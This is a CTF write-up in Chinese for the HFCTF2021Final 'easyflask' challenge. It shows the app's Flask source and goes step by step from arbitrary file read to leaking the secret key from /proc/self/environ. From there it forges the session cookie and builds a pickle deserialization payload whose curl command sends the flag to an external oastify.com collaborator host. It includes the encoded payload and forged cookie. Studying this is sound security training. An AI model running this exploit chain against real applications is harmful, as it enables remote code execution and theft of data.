---
title: HFCTF2021Final-easyflask
date: 2025-05-26 22:13:47
tags:
- flask环境变量
- pickle反序列化
- session伪造
- 反弹shell
- 外带数据
category:
- 刷题笔记
---

# HFCTF2021Final-easyflask

首先很简单利用任意文件读取漏洞拿到源码

```

#!/usr/bin/python3.6
import os
import pickle

from base64 import b64decode
from flask import Flask, request, render_template, session

app = Flask(__name__)
app.config["SECRET_KEY"] = "*******"

User = type('User', (object,), {
    'uname': 'test',
    'is_admin': 0,
    '__repr__': lambda o: o.uname,
})


@app.route('/', methods=('GET',))
def index_handler():
    if not session.get('u'):
        u = pickle.dumps(User())
        session['u'] = u
    return "/file?file=index.js"


@app.route('/file', methods=('GET',))
def file_handler():
    path = request.args.get('file')
    path = os.path.join('static', path)
    if not os.path.exists(path) or os.path.isdir(path) \
            or '.py' in path or '.sh' in path or '..' in path or "flag" in path:
        return 'disallowed'

    with open(path, 'r') as fp:
        content = fp.read()
    return content


@app.route('/admin', methods=('GET',))
def admin_handler():
    try:
        u = session.get('u')
        if isinstance(u, dict):
            u = b64decode(u.get('b'))
        u = pickle.loads(u)
    except Exception:
        return 'uhh?'

    if u.is_admin == 1:
        return 'welcome, admin'
    else:
        return 'who are you?'


if __name__ == '__main__':
    app.run('0.0.0.0', port=80, debug=False)

```

查看cookie，发现了session

```
eyJ1Ijp7IiBiIjoiZ0FTVkdBQUFBQUFBQUFDTUNGOWZiV0ZwYmw5ZmxJd0VWWE5sY3BTVGxDbUJsQzQ9In19.aDR5fQ.cfRdJ4sQNf1e0FVaWOD8k5UH6gg
```

用脚本解密看看

```
b'{"u":{" b":"gASVGAAAAAAAAACMCF9fbWFpbl9flIwEVXNlcpSTlCmBlC4="}}'
```

然后base64解密发现很明显是序列化的数据。

/admin路由存在pickle漏洞，我们现在只需要伪造一个session，保证session的键u，以及键u的值中的键b为Python序列化的数据，我们需要的构造恶意序列化数据打入其中。

查看flask的默认全局变量的路径`/proc/self/environ`

得到密钥

```
secret_key=glzjin22948575858jfjfjufirijidjitg3uiiuuh
```

然后就是构造pickle反序列化，这里我们可以反弹shell也可以外带数据。这里我用的bp的外带模块

```
import base64
import pickle


class A(object):
    def __reduce__(self):
        return (eval, ("__import__('os').system('curl http://www.0cd1ryjktg2zozuocea50scsfjla90xp.oastify.com/?1=`cat /flag`')",))
a = A()
print( base64.b64encode( pickle.dumps(a) ) )
```

输出

```
gASVggAAAAAAAACMCGJ1aWx0aW5zlIwEZXZhbJSTlIxmX19pbXBvcnRfXygnb3MnKS5zeXN0ZW0oJ2N1cmwgaHR0cDovL3d3dy4wY2Qxcnlqa3RnMnpvenVvY2VhNTBzY3NmamxhOTB4cC5vYXN0aWZ5LmNvbS8/MT1gY2F0IC9mbGFnYCcplIWUUpQu
```

然后我们要用脚本来构造session

session结构：

```
"{'u':{'b':'gASVggAAAAAAAACMCGJ1aWx0aW5zlIwEZXZhbJSTlIxmX19pbXBvcnRfXygnb3MnKS5zeXN0ZW0oJ2N1cmwgaHR0cDovL3d3dy4wY2Qxcnlqa3RnMnpvenVvY2VhNTBzY3NmamxhOTB4cC5vYXN0aWZ5LmNvbS8/MT1gY2F0IC9mbGFnYCcplIWUUpQu'}}"
```

在kali里使用flask_session_cookie_manager3.py脚本加密

```
python flask_session_cookie_manager3.py encode -s "glzjin22948575858jfjfjufirijidjitg3uiiuuh" -t "{'u':{'b':'gASVggAAAAAAAACMCGJ1aWx0aW5zlIwEZXZhbJSTlIxmX19pbXBvcnRfXygnb3MnKS5zeXN0ZW0oJ2N1cmwgaHR0cDovL3d3dy4wY2Qxcnlqa3RnMnpvenVvY2VhNTBzY3NmamxhOTB4cC5vYXN0aWZ5LmNvbS8/MT1gY2F0IC9mbGFnYCcplIWUUpQu'}}"
```

payload：

```
.eJwtzEsSgiAAANC7cIFQcibdJf00pUlNwB1Q4ULQFqHZdPda9A7w3uAJojeQIAJ6XdZar_9wjvepJ-gEBQ3mLhm3DWtamZZVl0yGeeEgWeyULe7spa1EuT2WwXxjBDYU9qlPPGVGLQ4FVJveZeiKrq_lyP3zpGz3EKiwuR3czdaO-3VLqnjmiBhhpvZUxUuFA8d_l6BNkBniZLla5JWnub-DCQ6N3O8sx2roEnq5DOcn-Hy-NxBDJQ.aDSA2w.8kCyVMgLdxzBCiMKaAtQq6riRM8
```

将构造的payload打入session，然后在/admin界面刷新一遍，即可在bp中外带到flag。



















